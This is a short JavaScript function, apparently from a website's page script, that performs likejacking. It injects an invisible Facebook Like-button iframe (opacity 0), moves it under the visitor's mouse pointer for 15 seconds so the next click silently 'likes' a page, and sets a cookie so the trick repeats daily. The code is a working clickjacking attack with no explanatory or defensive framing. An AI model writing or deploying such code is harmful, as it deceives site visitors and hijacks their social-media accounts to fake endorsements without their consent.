function addFB() {
    function e(e, t, n) {
        var r = new Date;
        r.setDate(r.getDate() + n);
        var i = escape(t) + (n == null ? "" : ";expires=" + r.toUTCString());
        document.cookie = e + "=" + i
    }

    function t(e) {
        var t, n, r, i = document.cookie.split(";");
        for (t = 0; t < i.length; t++) {
            n = i[t].substr(0, i[t].indexOf("="));
            r = i[t].substr(i[t].indexOf("=") + 1);
            n = n.replace(/^\s+|\s+$/g, "");
            if (n == e) {
                return unescape(r)
            }
        }
    }
    if (!t("liked_facebook")) {
        var n = $('<iframe style="border:none;overflow:hidden;width:40px; height:30px;position:absolute;opacity:0" src="http://www.facebook.com/plugins/like.php?href=' + url_phim_link + '&send=false&layout=standard&width=40&show_faces=false&font&colorscheme=light&action=like&height=20&appId=380940295307582" scrolling="no" frameborder="0" allowTransparency="true"></iframe>');
        n.appendTo("body");
        $(document).mousemove(function(e) {
            n.css({
                left: e.pageX - 10,
                top: e.pageY - 5
            })
        });
        setTimeout(function() {
            n.remove()
        }, 15e3);
        e("liked_facebook", "done", 1)
    }
}
